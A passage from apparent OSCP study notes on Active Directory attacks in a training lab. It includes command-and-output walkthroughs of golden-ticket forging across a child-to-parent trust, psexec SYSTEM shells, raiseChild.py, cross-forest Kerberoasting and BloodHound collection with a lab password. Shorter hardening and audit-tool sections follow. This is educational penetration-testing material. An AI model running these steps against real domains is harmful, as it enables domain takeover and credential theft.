</span></span><span style=display:flex><span>501: LOGISTICS\Guest (SidTypeUser)
</span></span><span style=display:flex><span>502: LOGISTICS\krbtgt (SidTypeUser)
</span></span><span style=display:flex><span>512: LOGISTICS\Domain Admins (SidTypeGroup)
</span></span><span style=display:flex><span>513: LOGISTICS\Domain Users (SidTypeGroup)
</span></span><span style=display:flex><span>514: LOGISTICS\Domain Guests (SidTypeGroup)
</span></span><span style=display:flex><span>515: LOGISTICS\Domain Computers (SidTypeGroup)
</span></span><span style=display:flex><span>516: LOGISTICS\Domain Controllers (SidTypeGroup)
</span></span><span style=display:flex><span>517: LOGISTICS\Cert Publishers
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=grabbing-the-domain-sid--attaching-to-enterprise-admins-rid>Grabbing the Domain SID & Attaching to Enterprise Admin&rsquo;s RID</h4><p>Attacking Domain Trusts - Child -> Parent Trusts - from Linux</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ lookupsid.py logistics.inlanefreight.local/local-student_adm@172.16.5.5 | grep -B12 &#34;Enterprise Admins&#34;
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Password:
</span></span><span style=display:flex><span>[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
</span></span><span style=display:flex><span>498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
</span></span><span style=display:flex><span>500: INLANEFREIGHT\administrator (SidTypeUser)
</span></span><span style=display:flex><span>501: INLANEFREIGHT\guest (SidTypeUser)
</span></span><span style=display:flex><span>502: INLANEFREIGHT\krbtgt (SidTypeUser)
</span></span><span style=display:flex><span>512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
</span></span><span style=display:flex><span>513: INLANEFREIGHT\Domain Users (SidTypeGroup)
</span></span><span style=display:flex><span>514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
</span></span><span style=display:flex><span>515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
</span></span><span style=display:flex><span>516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
</span></span><span style=display:flex><span>517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
</span></span><span style=display:flex><span>518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
</span></span><span style=display:flex><span>519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
</span></span></code></pre></div><p>Â </p><p>Â </p><ul><li>The KRBTGT hash for the child domain: <code>9d765b482771505cbe97411065964d5f</code></li><li>The SID for the child domain: <code>S-1-5-21-2806153819-209893948-922872689</code></li><li>The name of a target user in the child domain (does not need to exist!): <code>hacker</code></li><li>The FQDN of the child domain: <code>LOGISTICS.INLANEFREIGHT.LOCAL</code></li></ul><p>The SID of the Enterprise Admins group of the root domain: <code>S-1-5-21-3842939050-3880317879-2865463114-519</code></p><h4 id=constructing-a-golden-ticket-using-ticketerpy>Constructing a Golden Ticket using ticketer.py</h4><p>Attacking Domain Trusts - Child -> Parent Trusts - from Linux</p><h4 id=constructing-a-golden-ticket-using-ticketerpy-1>Constructing a Golden Ticket using ticketer.py</h4><p>Attacking Domain Trusts - Child -> Parent Trusts - from Linux</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[*] Creating basic skeleton ticket and PAC Infos
</span></span><span style=display:flex><span>[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
</span></span><span style=display:flex><span>[*] 	PAC_LOGON_INFO
</span></span><span style=display:flex><span>[*] 	PAC_CLIENT_INFO_TYPE
</span></span><span style=display:flex><span>[*] 	EncTicketPart
</span></span><span style=display:flex><span>[*] 	EncAsRepPart
</span></span><span style=display:flex><span>[*] Signing/Encrypting final ticket
</span></span><span style=display:flex><span>[*] 	PAC_SERVER_CHECKSUM
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=setting-the-krb5ccname-environment-variable>Setting the KRB5CCNAME Environment Variable</h4><p>Attacking Domain Trusts - Child -> Parent Trusts - from Linux</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ export KRB5CCNAME=hacker.ccache
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=getting-a-system-shell-using-impackets-psexecpy>Getting a SYSTEM shell using Impacket&rsquo;s psexec.py</h4><p>Attacking Domain Trusts - Child -> Parent Trusts - from Linux</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[*] Requesting shares on 172.16.5.5.....
</span></span><span style=display:flex><span>[*] Found writable share ADMIN$
</span></span><span style=display:flex><span>[*] Uploading file nkYjGWDZ.exe
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=performing-the-attack-with-raisechildpy>Performing the Attack with raiseChild.py</h4><p>Attacking Domain Trusts - Child -> Parent Trusts - from Linux</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/local-student_adm
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Password:
</span></span><span style=display:flex><span>[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
</span></span><span style=display:flex><span>[*] Forest FQDN is: INLANEFREIGHT.LOCAL
</span></span><span style=display:flex><span>[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
</span></span><span style=display:flex><span>[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
</span></span><span style=display:flex><span>[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
</span></span><span style=display:flex><span>LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
</span></span><span style=display:flex><span>LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
</span></span><span style=display:flex><span>[*] Getting credentials for INLANEFREIGHT.LOCAL
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><h1 id=attacking-domain-trusts---cross-forest-trust-abuse---from-windows>Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows</h1><h4 id=enumerating-accounts-for-associated-spns-using-get-domainuser>Enumerating Accounts for Associated SPNs Using Get-DomainUser</h4><p>Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc</code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL</code></pre></div><p>Â </p><p>Â </p><h4 id=performing-a-kerberoasting-attacking-with-rubeus-using-domain-flag>Performing a Kerberoasting Attacking with Rubeus Using /domain Flag</h4><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : mssqlsvc
[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
[*] Searching path &#39;LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL&#39; for &#39;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#39;

[*] Total kerberoastable users : 1

[*] SamAccountName         : mssqlsvc
[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
[*] PwdLastSet             : 3/24/2022 12:47:52 PM
[*] Supporte</code></pre></div><p>Â </p><p>Â </p><h4 id=accessing-dc03-using-enter-pssession>Accessing DC03 Using Enter-PSSession</h4><p>Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents&gt; whoami
inlanefreight\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents&gt; ipconfig /all

Windows IP Configuration</code></pre></div><p>Â </p><p>Â </p><h2 id=cross-forest-kerberoasting>Cross-Forest Kerberoasting</h2><h4 id=using-getuserspnspy>Using GetUserSPNs.py</h4><p>Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Password:
</span></span><span style=display:flex><span>ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
</span></span><span style=display:flex><span>-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
</span></span><span style=display:flex><span>MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=using-the--request-flag>Using the -request Flag</h4><p>Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Password:
</span></span><span style=display:flex><span>ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
</span></span><span style=display:flex><span>-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
</span></span><span style=display:flex><span>MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  &lt;never&gt;               
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10&lt;SNIP&gt;
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=adding-inlanefreightlocal-information-to-etcresolvconf>Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf</h4><p>Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ cat /etc/resolv.conf 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span># Dynamic resolv.conf<span style=color:#f92672>(</span>5<span style=color:#f92672>)</span> file <span style=color:#66d9ef>for</span> glibc resolver<span style=color:#f92672>(</span>3<span style=color:#f92672>)</span> generated by resolvconf<span style=color:#f92672>(</span>8<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
</span></span><span style=display:flex><span># 127.0.0.53 is the systemd-resolved stub resolver.
</span></span><span style=display:flex><span># run <span style=color:#e6db74>&#34;resolvectl status&#34;</span> to see details about the actual nameservers.
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>#nameserver 1.1.1.1
</span></span><span style=display:flex><span>#nameserver 8.8.8.8
</span></span><span style=display:flex><span>domain INLANEFREIGHT.LOCAL
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=running-bloodhound-python-against-inlanefreightlocal>Running bloodhound-python Against INLANEFREIGHT.LOCAL</h4><p>Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>INFO: Found AD domain: inlanefreight.local
</span></span><span style=display:flex><span>INFO: Connecting to LDAP server: ACADEMY-EA-DC01
</span></span><span style=display:flex><span>INFO: Found 1 domains
</span></span><span style=display:flex><span>INFO: Found 2 domains in the forest
</span></span><span style=display:flex><span>INFO: Found 559 computers
</span></span><span style=display:flex><span>INFO: Connecting to LDAP server: ACADEMY-EA-DC01
</span></span><span style=display:flex><span>INFO: Found 2950 users
</span></span><span style=display:flex><span>INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
</span></span><span style=display:flex><span>INFO: Found 183 groups
</span></span><span style=display:flex><span>INFO: Found 2 trusts
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=adding-freightlogisticslocal-information-to-etcresolvconf>Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf</h4><p>Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ cat /etc/resolv.conf 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span># Dynamic resolv.conf<span style=color:#f92672>(</span>5<span style=color:#f92672>)</span> file <span style=color:#66d9ef>for</span> glibc resolver<span style=color:#f92672>(</span>3<span style=color:#f92672>)</span> generated by resolvconf<span style=color:#f92672>(</span>8<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
</span></span><span style=display:flex><span># 127.0.0.53 is the systemd-resolved stub resolver.
</span></span><span style=display:flex><span># run <span style=color:#e6db74>&#34;resolvectl status&#34;</span> to see details about the actual nameservers.
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>#nameserver 1.1.1.1
</span></span><span style=display:flex><span>#nameserver 8.8.8.8
</span></span><span style=display:flex><span>domain FREIGHTLOGISTICS.LOCAL
</span></span><span style=display:flex><span>nameserver 172.16.5.238
</span></span></code></pre></div><p>The <code>bloodhound-python</code> command will look similar to the previous one:</p><h4 id=running-bloodhound-python-against-freightlogisticslocal>Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL</h4><p>Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>INFO: Found AD domain: freightlogistics.local
</span></span><span style=display:flex><span>INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
</span></span><span style=display:flex><span>INFO: Found 1 domains
</span></span><span style=display:flex><span>INFO: Found 1 domains in the forest
</span></span><span style=display:flex><span>INFO: Found 5 computers
</span></span><span style=display:flex><span>INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
</span></span><span style=display:flex><span>INFO: Found 9 users
</span></span><span style=display:flex><span>INFO: Connecting to GC LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
</span></span><span style=display:flex><span>INFO: Found 52 groups
</span></span><span style=display:flex><span>INFO: Found 1 trusts
</span></span><span style=display:flex><span>INFO: Starting computer enumeration with 10 workers
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><p><a href=#R-image-6ef643e57a65c99b73f9861dd41c1f92 class=lightbox-link><img alt=07130cc2e9d09cf0fb3609698cd92f78.png class="lazy lightbox figure-image" loading=lazy src=../../resources/07130cc2e9d09cf0fb3609698cd92f78.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-6ef643e57a65c99b73f9861dd41c1f92><img alt=07130cc2e9d09cf0fb3609698cd92f78.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/07130cc2e9d09cf0fb3609698cd92f78.png></a></p><p>Â </p><p>Â </p><h1 id=hardening-active-directory>Hardening Active Directory</h1><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>S C:\Users\local-student&gt; Get-ADGroup -Identity &#34;Protected Users&#34; -Properties Name,Description,Members


Description       : Members of this group are afforded additional protections against authentication security threats.
                    See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
DistinguishedName : CN=Protected Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
GroupCategory     : Security
GroupScope        : Global
Members           : {CN=sqlprod,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL, CN=sqldev,OU=Service
                    Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL}
Name              : Protected Users
ObjectClass       : group
ObjectGUID        : e4e19353-d08f-4790-95bc-c544a38cd534
SamAccountName    : Protected Users
SID               : S-1-5-21-2974783224-3764228556-2640795941-525</code></pre></div><p>Â </p><h1 id=additional-ad-auditing-techniques>Additional AD Auditing Techniques</h1><h4 id=creating-a-snapshot-of-ad-with-ad-explorer>Creating a Snapshot of AD with AD Explorer</h4><p><a href=#R-image-f4e919c0a43200a12dad66c0f68cc0a1 class=lightbox-link><img alt=a08c0e361f668a32be8fb58829bfc915.png class="lazy lightbox figure-image" loading=lazy src=../../resources/a08c0e361f668a32be8fb58829bfc915.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-f4e919c0a43200a12dad66c0f68cc0a1><img alt=a08c0e361f668a32be8fb58829bfc915.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/a08c0e361f668a32be8fb58829bfc915.png></a></p><p>Â </p><p>Â </p><h2 id=pingcastle>PingCastle</h2><p><a href=https://www.pingcastle.com/documentation/ rel=external>PingCastle</a> is a powerful tool that evaluates the security posture of an AD environment and provides us the results in several different maps and graphs. Thinking about security for a second, if you do not have an active inventory of the hosts in your enterprise, PingCastle can be a great resource to help you gather one in a nice user-readable map of the domain. PingCastle is different from tools such as PowerView and BloodHound because, aside from providing us with enumeration data that can inform our attacks, it also provides a detailed report of the target domain&rsquo;s security level using a methodology based on a risk assessment/maturity framework. The scoring shown in the report is based on the <a href=https://en.wikipedia.org/wiki/Capability_Maturity_Model_Integration rel=external>Capability Maturity Model Integration</a> (CMMI). For a quick look at the help context provided, you can issue the <code>--help</code> switch in cmd-promp</p><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; PingCastle.exe --help

switch:
  --help              : display this message
  --interactive       : force the interactive mode
  --log               : generate a log file
  --log-console       : add log to the console
  --log-samba &lt;option&gt;: enable samba login (example: 10)

Common options when connecting to the AD
  --server &lt;server&gt;   : use this server (default: current domain controller)
                        the special value * or *.forest do the healthcheck for all domains
  --port &lt;port&gt;       : the port to use for ADWS or LDAP (default: 9389 or 389)
  --user &lt;user&gt;       : use this user (default: integrated authentication)
  --password &lt;pass&gt;   : use this password (default: asked on a secure prompt)
  --protocol &lt;proto&gt;  : selection the protocol to use among LDAP or ADWS (fastest)
                      : ADWSThenLDAP (default), ADWSOnly, LDAPOnly, LDAPThenADWS</code></pre></div><p>Â </p><p>Â </p><h2 id=group3r>Group3r</h2><p><a href=https://github.com/Group3r/Group3r rel=external>Group3r</a> is a tool purpose-built to find vulnerabilities in Active Directory associated Group Policy. Group3r must be run from a domain-joined host with a domain user (it does not need to be an administrator), or in the context of a domain user (i.e., using <code>runas /netonly</code>).</p><h4 id=group3r-basic-usage>Group3r Basic Usage</h4><p>Additional AD Auditing Techniques</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; group3r.exe -f &lt;filepath-name.log</code></pre></div><p>Â </p><h4 id=running-adrecon>Running ADRecon</h4><p>Additional AD Auditing Techniques</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-powershell-session data-lang=powershell-session>PS C:\local&gt; .\ADRecon.ps1

[*] ADRecon v1.1 by Prashant Mahajan (@prashant3535)
[*] Running on INLANEFREIGHT.LOCAL\MS01 - Member Server
[*] Commencing - 03/28/2022 09:24:58
[-] Domain
[-] Forest
[-] Trusts
[-] Sites
[-] Subnets
[-] SchemaHistory - May take some time
[-] Default Password Policy
[-] Fine Grained Password Policy - May need a Privileged Account
[-] Domain Controllers
[-] Users and SPNs - May take some time
[-] PasswordAttributes - Experimental
[-] Groups and Membership Changes - May take some time
[-] Group Memberships - May take some time
[-] OrganizationalUnits (OUs)
[-] GPOs
[-] gPLinks - Scope of Management (SOM)
[-] DNS Zones and Records
[-] Printers
[-] Computers and SPNs - May take some time
[-] LAPS - Needs Privileged Account
[-] BitLocker Recovery Keys - Needs Privileged Account
[-] GPOReport - May take some time
[*] Total Execution Time (mins): 11.05
[*] Output Directory: C:\Tools\ADRecon-Report-20220328092458</code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><footer class=footline></footer></article></div></main></div><aside id=R-sidebar class=default-animation><div id=R-header-topbar class=default-animation></div><div id=R-header-wrapper class=default-animation><div id=R-header class=default-animation><a id=R-logo class=R-default href=../../><div class=logo-title style=display:flex;align-items:center><img src=../../images/logo.png alt=Logo style=width:90px;height:80>
<span>DrakonOps</span></div></a></div><search><form action=../../search/index.html method=get><div class="searchbox default-animation"><button class=search-detail type=submit title="Search (CTRL+ALT+f)"><i class="fas fa-search"></i></button>
<label class=a11y-only for=R-search-by>Search</label>
<input data-search-input id=R-search-by name=search-by class=search-by type=search placeholder=Search...>
<button class=search-clear type=button data-search-clear title="Clear search"><i class="fas fa-times" title="Clear search"></i></button></div></form></search></div><div id=R-homelinks class="default-animation homelinks"><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-homelinks"><ul class="space collapsible-menu"><li data-nav-url=../../index.html><a class=padding href=../../index.html><i class="fa-fw fas fa-home"></i> Home</a></li></ul></div><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-headercontrols"><ul></ul></div><div class="R-menu-divider default-animation"><hr class=padding></div></div><div id=R-content-wrapper class=highlightable><div class="R-sidebarmenu R-shortcutmenu-main"><ul class="enlarge morespace collapsible-menu"><li class=parent data-nav-url=../../oscp-notes/index.html><input type=checkbox id=R-section-5f51e3ac21bcc264f305c28eac7484ea aria-controls=R-subsections-5f51e3ac21bcc264f305c28eac7484ea checked><label for=R-section-5f51e3ac21bcc264f305c28eac7484ea><i class="fa-fw fas fa-chevron-right"></i><span class=a11y-only>Submenu OSCP Notes</span></label><a class=padding href=../../oscp-notes/index.html>OSCP Notes<i class="fa-fw fas fa-check read-icon"></i></a><ul id=R-subsections-5f51e3ac21bcc264f305c28eac7484ea class=collapsible-menu><li data-nav-url=../../oscp-notes/main-methodology/index.html><a class=padding href=../../oscp-notes/main-methodology/index.html>main methodology<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/methodology/index.html><a class=padding href=../../oscp-notes/methodology/index.html>methodology<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/project/index.html><a class=padding href=../../oscp-notes/project/index.html>project<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/footprinting-and-finger-printing-web-apps/index.html><a class=padding href=../../oscp-notes/footprinting-and-finger-printing-web-apps/index.html>footprinting and finger printing web apps<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/nmap/index.html><a class=padding href=../../oscp-notes/nmap/index.html>nmap<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/go-busters/index.html><a class=padding href=../../oscp-notes/go-busters/index.html>Go busters<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/dns/index.html><a class=padding href=../../oscp-notes/dns/index.html>dns<i class="fa-fw fas fa-check read-icon"></i></a></li><li 